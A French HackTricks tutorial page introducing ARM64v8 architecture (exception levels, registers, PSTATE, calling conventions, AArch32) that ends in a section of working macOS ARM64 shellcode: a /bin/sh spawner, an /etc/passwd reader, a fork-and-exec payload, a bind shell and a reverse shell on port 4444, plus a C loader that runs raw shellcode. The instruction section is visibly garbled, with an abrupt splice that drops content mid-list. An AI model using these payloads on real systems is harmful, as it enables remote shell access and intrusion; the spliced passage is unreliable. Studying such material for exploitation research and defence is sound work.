# Introduction à ARM64v8

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe télégramme**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Niveaux d'exception - EL (ARM64v8)**

Dans l'architecture ARMv8, les niveaux d'exécution, connus sous le nom de Niveaux d'exception (ELs), définissent le niveau de privilège et les capacités de l'environnement d'exécution. Il existe quatre niveaux d'exception, allant de EL0 à EL3, chacun ayant un objectif différent :

1. **EL0 - Mode Utilisateur** :
* C'est le niveau le moins privilégié et est utilisé pour exécuter le code d'application régulier.
* Les applications s'exécutant au EL0 sont isolées les unes des autres et du logiciel système, améliorant la sécurité et la stabilité.
2. **EL1 - Mode Noyau du Système d'Exploitation** :
* La plupart des noyaux de systèmes d'exploitation fonctionnent à ce niveau.
* EL1 a plus de privilèges que EL0 et peut accéder aux ressources système, mais avec certaines restrictions pour assurer l'intégrité du système.
3. **EL2 - Mode Hyperviseur** :
* Ce niveau est utilisé pour la virtualisation. Un hyperviseur fonctionnant au EL2 peut gérer plusieurs systèmes d'exploitation (chacun dans son propre EL1) fonctionnant sur le même matériel physique.
* EL2 offre des fonctionnalités pour l'isolation et le contrôle des environnements virtualisés.
4. **EL3 - Mode Moniteur Sécurisé** :
* C'est le niveau le plus privilégié et est souvent utilisé pour le démarrage sécurisé et les environnements d'exécution de confiance.
* EL3 peut gérer et contrôler les accès entre les états sécurisés et non sécurisés (comme le démarrage sécurisé, le système d'exploitation de confiance, etc.).

L'utilisation de ces niveaux permet une gestion structurée et sécurisée des différents aspects du système, des applications utilisateur au logiciel système le plus privilégié. L'approche d'ARMv8 en matière de niveaux de privilège aide à isoler efficacement les différents composants du système, renforçant ainsi la sécurité et la robustesse du système.

## **Registres (ARM64v8)**

ARM64 dispose de **31 registres à usage général**, étiquetés de `x0` à `x30`. Chacun peut stocker une valeur de **64 bits** (8 octets). Pour les opérations qui nécessitent uniquement des valeurs de 32 bits, les mêmes registres peuvent être accédés en mode 32 bits en utilisant les noms w0 à w30.

1. **`x0`** à **`x7`** - Ils sont généralement utilisés comme registres temporaires et pour passer des paramètres aux sous-routines.
* **`x0`** transporte également les données de retour d'une fonction
2. **`x8`** - Dans le noyau Linux, `x8` est utilisé comme numéro d'appel système pour l'instruction `svc`. **Dans macOS, c'est le x16 qui est utilisé !**
3. **`x9`** à **`x15`** - Plus de registres temporaires, souvent utilisés pour les variables locales.
4. **`x16`** et **`x17`** - **Registres d'appel intraprocedure**. Registres temporaires pour les valeurs immédiates. Ils sont également utilisés pour les appels de fonction indirects et les stubs PLT (Procedure Linkage Table).
* **`x16`** est utilisé comme **numéro d'appel système** pour l'instruction **`svc`** dans **macOS**.
5. **`x18`** - **Registre de plateforme**. Il peut être utilisé comme un registre à usage général, mais sur certaines plateformes, ce registre est réservé à des utilisations spécifiques à la plateforme : Pointeur vers le bloc d'environnement de thread actuel dans Windows, ou pour pointer vers la structure de tâche en cours d'exécution dans le noyau Linux.
6. **`x19`** à **`x28`** - Ce sont des registres sauvegardés par l'appelant. Une fonction doit préserver les valeurs de ces registres pour son appelant, donc elles sont stockées dans la pile et récupérées avant de revenir à l'appelant.
7. **`x29`** - **Pointeur de cadre** pour suivre la trame de pile. Lorsqu'un nouveau cadre de pile est créé parce qu'une fonction est appelée, le registre **`x29`** est **stocké dans la pile** et la **nouvelle** adresse du pointeur de cadre est (adresse **`sp`**) est **stockée dans ce registre**.
* Ce registre peut également être utilisé comme un **registre à usage général** bien qu'il soit généralement utilisé comme référence aux **variables locales**.
8. **`x30`** ou **`lr`**- **Registre de lien**. Il contient l'**adresse de retour** lorsqu'une instruction `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) est exécutée en stockant la valeur **`pc`** dans ce registre.
* Il pourrait également être utilisé comme tout autre registre.
9. **`sp`** - **Pointeur de pile**, utilisé pour suivre le sommet de la pile.
* la valeur de **`sp`** doit toujours être maintenue au moins à une **alignement de quadword** ou une exception d'alignement peut se produire.
10. **`pc`** - **Compteur de programme**, qui pointe vers l'instruction suivante. Ce registre ne peut être mis à jour que par la génération d'exceptions, les retours d'exception et les branches. Les seules instructions ordinaires qui peuvent lire ce registre sont les instructions de branchement avec lien (BL, BLR) pour stocker l'adresse **`pc`** dans **`lr`** (Registre de lien).
11. **`xzr`** - **Registre zéro**. Aussi appelé **`wzr`** dans sa forme de registre **32 bits**. Peut être utilisé pour obtenir facilement la valeur zéro (opération courante) ou pour effectuer des comparaisons en utilisant **`subs`** comme **`subs XZR, Xn, #10`** en stockant les données résultantes nulle part (dans **`xzr`**).

Les registres **`Wn`** sont la version **32 bits** du registre **`Xn`**.

### Registres SIMD et à virgule flottante

De plus, il y a un autre **32 registres de 128 bits de longueur** qui peuvent être utilisés dans des opérations SIMD (single instruction multiple data) optimisées et pour effectuer des calculs en virgule flottante. Ceux-ci sont appelés les registres Vn bien qu'ils puissent également fonctionner en **64 bits**, **32 bits**, **16 bits** et **8 bits** et sont alors appelés **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** et **`Bn`**.

### Registres Système

**Il y a des centaines de registres système**, également appelés registres à usage spécial (SPRs), qui sont utilisés pour **surveiller** et **contrôler** le **comportement des processeurs**.\
Ils ne peuvent être lus ou définis qu'à l'aide de l'instruction spéciale dédiée **`mrs`** et **`msr`**.

Les registres spéciaux **`TPIDR_EL0`** et **`TPIDDR_EL0`** sont couramment trouvés lors de l'ingénierie inverse. Le suffixe `EL0` indique le **niveau d'exception minimal** à partir duquel le registre peut être accédé (dans ce cas, EL0 est le niveau d'exception (privilège) régulier avec lequel les programmes réguliers fonctionnent).\
Ils sont souvent utilisés pour stocker l'**adresse de base de la région de stockage local de thread** en mémoire. Habituellement, le premier est lisible et inscriptible pour les programmes fonctionnant en EL0, mais le second peut être lu à partir de EL0 et écrit à partir de EL1 (comme le noyau).

* `mrs x0, TPIDR_EL0 ; Lire TPIDR_EL0 dans x0`
* `msr TPIDR_EL0, X0 ; Écrire x0 dans TPIDR_EL0`

### **PSTATE**

**PSTATE** contient plusieurs composants de processus sérialisés dans le registre spécial visible par le système d'exploitation **`SPSR_ELx`**, X étant le **niveau de permission de l'exception déclenchée** (cela permet de récupérer l'état du processus lorsque l'exception se termine).\
Voici les champs accessibles :

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* Les drapeaux de condition **`N`**, **`Z`**, **`C`** et **`V`** :
* **`N`** signifie que l'opération a donné un résultat négatif
* **`Z`** signifie que l'opération a donné zéro
* **`C`** signifie que l'opération a porté
* **`V`** signifie que l'opération a donné un débordement signé :
* La somme de deux nombres positifs donne un résultat négatif.
* La somme de deux nombres négatifs donne un résultat positif.
* En soustraction, lorsqu'un grand nombre négatif est soustrait d'un plus petit nombre positif (ou vice versa), et que le résultat ne peut pas être représenté dans la plage de la taille de bit donnée.

{% hint style="warning" %}
Toutes les instructions ne mettent pas à jour ces drapeaux. Certaines comme **`CMP`** ou **`TST`** le font, et d'autres qui ont un suffixe s comme **`ADDS`** le font également.
{% endhint %}

* Le drapeau de **largeur de registre actuelle (`nRW`)** : Si le drapeau a la valeur 0, le programme fonctionnera dans l'état d'exécution AArch64 une fois repris.
* Le **Niveau d'Exception actuel** (**`EL`**) : Un programme régulier fonctionnant en EL0 aura la valeur 0
* Le drapeau de **pas à pas unique** (**`SS`**) : Utilisé par les débogueurs pour effectuer un pas à pas unique en réglant le drapeau SS sur 1 à l'intérieur de **`SPSR_ELx`** par une exception. Le programme exécutera une étape et émettra une exception de pas à pas unique.
* Le drapeau d'état d'exception illégal (**`IL`**) : Il est utilisé pour marquer lorsqu'un logiciel privilégié effectue un transfert de niveau d'exception invalide, ce drapeau est réglé sur 1 et le processeur déclenche une exception d'état illégal.
* Les drapeaux **`DAIF`** : Ces drapeaux permettent à un programme privilégié de masquer sélectivement certaines exceptions externes.
* Si **`A`** est 1, cela signifie que des **aborts asynchrones** seront déclenchés. Le **`I`** configure pour répondre aux **Demandes d'Interruption Matérielles** (IRQs). et le F est lié aux **Demandes d'Interruption Rapides** (FIRs).
* Les drapeaux de sélection du pointeur de pile (**`SPS`**) : Les programmes privilégiés fonctionnant en EL1 et au-dessus peuvent basculer entre l'utilisation de leur propre registre de pointeur de pile et celui du modèle utilisateur (par exemple, entre `SP_EL1` et `EL0`). Ce basculement est effectué en écrivant dans le registre spécial **`SPSel`**. Cela ne peut pas être fait à partir de EL0.

## **Convention d'appel (ARM64v8)**

La convention d'appel ARM64 spécifie que les **huit premiers paramètres** d'une fonction sont passés dans les registres **`x0` à `x7`**. Les **paramètres supplémentaires** sont passés sur la **pile**. La **valeur de retour** est renvoyée dans le registre **`x0`**, ou dans **`x1`** également **si elle fait 128 bits de long**. Les registres **`x19`** à **`x30`** et **`sp`** doivent être **préservés** lors des appels de fonction.

Lors de la lecture d'une fonction en assembleur, recherchez le **prologue et l'épilogue de la fonction**. Le **prologue** implique généralement de **sauvegarder le pointeur de cadre (`x29`)**, de **mettre en place un nouveau pointeur de cadre**, et d'**allouer de l'espace sur la pile**. L'**épilogue** implique généralement de **restaurer le pointeur de cadre sauvegardé** et de **retourner** de la fonction.

### Convention d'appel dans Swift

Swift a sa propre **convention d'appel** qui peut être trouvée sur [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instructions courantes (ARM64v8)**

Les instructions ARM64 ont généralement le **format `opcode dst, src1, src2`**, où **`opcode`** est l'**opération** à effectuer (comme `add`, `sub`, `mov`, etc.), **`dst`** est le registre de **destination** où le résultat sera stocké, et **`src1`** et **`src2`** sont les registres **source**. Des valeurs immédiates peuvent également être utilisées à la place des registres source.

* **`mov`**: **Déplacer** une valeur d'un **registre** à un autre.
* Exemple : `mov x0, x1` — Cela déplace la valeur de `x1` vers `x0`.
* **`ldr`**: **Charger** une valeur de la **mémoire** dans un **registre**.
* Exemple : `ldr x0, [x1]` — Cela charge une valeur de l'emplacement mémoire pointé par `x1` dans `x0`.
* **`str`**: **Stocker** une valeur d'un **registre** dans la **mémoire**.
* Exemple : `str x0, [x1]` — Cela stocke la valeur dans `x0` à l'emplacement mémoire pointé par `x1`.
* **`ldp`**: **Charger une paire de registres**. Cette instruction **charge deux registres** à partir d'**emplacements mémoire consécutifs**. L'adresse mémoire est généralement formée en ajoutant un décalage à la valeur dans un autre registre.
* Exemple : `ldp x0, x1, [x2]` — Cela charge `x0` et `x1` des emplacements mémoire à `x2` et `x2 + 8`, respectivement.
* **`stp`**: **Stocker une paire de registres**. Cette instruction **stocke deux registres** dans des **emplacements mémoire consécutifs**. L'adresse mémoire est généralement formée en ajoutant un décalage à la valeur dans un autre registre.
* Exemple
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Retour** : `ret` (rend le contrôle à l'appelant en utilisant l'adresse dans le registre de lien)

## État d'exécution AARCH32

Armv8-A prend en charge l'exécution de programmes 32 bits. **AArch32** peut fonctionner dans **deux jeux d'instructions** : **`A32`** et **`T32`** et peut basculer entre eux via **`l'interfonctionnement`**.\
Les programmes 64 bits **privilégiés** peuvent planifier l'**exécution de programmes 32 bits** en exécutant un transfert de niveau d'exception vers le 32 bits moins privilégié.\
Notez que la transition de 64 bits à 32 bits se produit avec une diminution du niveau d'exception (par exemple, un programme 64 bits en EL1 déclenchant un programme en EL0). Cela se fait en réglant le **bit 4 du** **`SPSR_ELx`** registre spécial **à 1** lorsque le fil de processus `AArch32` est prêt à être exécuté et le reste de `SPSR_ELx` stocke le CPSR des programmes **`AArch32`**. Ensuite, le processus privilégié appelle l'instruction **`ERET`** pour que le processeur passe à **`AArch32`** en entrant en A32 ou T32 selon le CPSR**.**

L'**`interfonctionnement`** se produit en utilisant les bits J et T du CPSR. `J=0` et `T=0` signifie **`A32`** et `J=0` et `T=1` signifie **T32**. Cela se traduit essentiellement par le réglage du **bit le plus bas à 1** pour indiquer que le jeu d'instructions est T32.\
Cela est défini lors des **instructions de branchement d'interfonctionnement**, mais peut également être défini directement avec d'autres instructions lorsque le PC est défini comme registre de destination. Exemple :

Un autre exemple :
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registres

Il y a 16 registres de 32 bits (r0-r15). **De r0 à r14**, ils peuvent être utilisés pour **toute opération**, cependant certains d'entre eux sont généralement réservés :

* **`r15`** : Compteur de programme (toujours). Contient l'adresse de l'instruction suivante. En A32 actuel + 8, en T32, actuel + 4.
* **`r11`** : Pointeur de cadre
* **`r12`** : Registre d'appel intra-procédural
* **`r13`** : Pointeur de pile
* **`r14`** : Registre de lien

De plus, les registres sont sauvegardés dans des **`registres bancaires`**. Ce sont des emplacements qui stockent les valeurs des registres permettant d'effectuer un **changement de contexte rapide** dans la gestion des exceptions et les opérations privilégiées pour éviter de devoir sauvegarder et restaurer manuellement les registres à chaque fois.\
Cela se fait en **sauvegardant l'état du processeur du `CPSR` au `SPSR`** du mode de processeur vers lequel l'exception est prise. Lors du retour de l'exception, le **`CPSR`** est restauré à partir du **`SPSR`**.

### CPSR - Registre d'état du programme actuel

En AArch32, le CPSR fonctionne de manière similaire à **`PSTATE`** en AArch64 et est également stocké dans **`SPSR_ELx`** lorsqu'une exception est prise pour restaurer plus tard l'exécution :

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Les champs sont divisés en plusieurs groupes :

* Registre d'état du programme d'application (APSR) : Drapeaux arithmétiques et accessibles depuis EL0
* Registres d'état d'exécution : Comportement du processus (géré par le système d'exploitation).

#### Registre d'état du programme d'application (APSR)

* Les drapeaux **`N`**, **`Z`**, **`C`**, **`V`** (tout comme en AArch64)
* Le drapeau **`Q`** : Il est mis à 1 chaque fois qu'une **saturation entière se produit** pendant l'exécution d'une instruction arithmétique de saturation spécialisée. Une fois qu'il est mis à **`1`**, il maintiendra la valeur jusqu'à ce qu'il soit manuellement remis à 0. De plus, il n'y a aucune instruction qui vérifie sa valeur implicitement, cela doit être fait en la lisant manuellement.
*   **`GE`** (Supérieur ou égal) Drapeaux : Il est utilisé dans les opérations SIMD (Single Instruction, Multiple Data), telles que "addition parallèle" et "soustraction parallèle". Ces opérations permettent de traiter plusieurs points de données dans une seule instruction.

Par exemple, l'instruction **`UADD8`** **ajoute quatre paires d'octets** (de deux opérandes de 32 bits) en parallèle et stocke les résultats dans un registre de 32 bits. Elle **définit ensuite les drapeaux `GE` dans l'`APSR`** en fonction de ces résultats. Chaque drapeau GE correspond à l'une des additions d'octets, indiquant si l'addition pour cette paire d'octets **a débordé**.

L'instruction **`SEL`** utilise ces drapeaux GE pour effectuer des actions conditionnelles.

#### Registres d'état d'exécution

* Les bits **`J`** et **`T`** : **`J`** doit être 0 et si **`T`** est 0, l'ensemble d'instructions A32 est utilisé, et s'il est 1, le T32 est utilisé.
* **Registre d'état du bloc IT** (`ITSTATE`) : Ce sont les bits de 10 à 15 et de 25 à 26. Ils stockent les conditions pour les instructions à l'intérieur d'un groupe préfixé par **`IT`**.
* Le bit **`E`** : Indique l'**endianness**.&#x20;
* **Bits de masque de mode et d'exception** (0-4) : Ils déterminent l'état d'exécution actuel. Le **5ème** indique si le programme s'exécute en 32 bits (un 1) ou en 64 bits (un 0). Les 4 autres représentent le **mode d'exception actuellement utilisé** (lorsqu'une exception se produit et qu'elle est gérée). Le numéro défini **indique la priorité actuelle** au cas où une autre exception est déclenchée pendant qu'elle est gérée.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`** : Certaines exceptions peuvent être désactivées en utilisant les bits **`A`**, `I`, `F`. Si **`A`** est 1, cela signifie que des **aborts asynchrones** seront déclenchés. Le **`I`** configure pour répondre aux **Demandes d'interruption matérielles externes** (IRQs). et le F est lié aux **Demandes d'interruption rapide** (FIRs).

## macOS

### Appels système BSD

Consultez [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Les appels système BSD auront **x16 > 0**.

### Pièges Mach

Consultez [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html). Les pièges Mach auront **x16 < 0**, donc vous devez appeler les numéros de la liste précédente avec un **moins** : **`_kernelrpc_mach_vm_allocate_trap`** est **`-10`**.

Vous pouvez également vérifier **`libsystem_kernel.dylib`** dans un désassembleur pour trouver comment appeler ces appels système (et BSD).
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Parfois, il est plus facile de vérifier le code **décompilé** de **`libsystem_kernel.dylib`** **que** de consulter le **code source** parce que le code de plusieurs appels système (BSD et Mach) est généré via des scripts (voir les commentaires dans le code source), tandis que dans la dylib, vous pouvez trouver ce qui est appelé.
{% endhint %}

### Shellcodes

Pour compiler :
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Code C pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tiré de [**ici**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) et expliqué.

{% tabs %}
{% tab title="avec adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="avec pile" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Lire avec cat

L'objectif est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, donc le deuxième argument (x1) est un tableau de paramètres (ce qui en mémoire signifie une pile des adresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invoquer une commande avec sh depuis un fork pour que le processus principal ne soit pas tué
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell depuis [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) sur le **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Depuis [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell vers **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
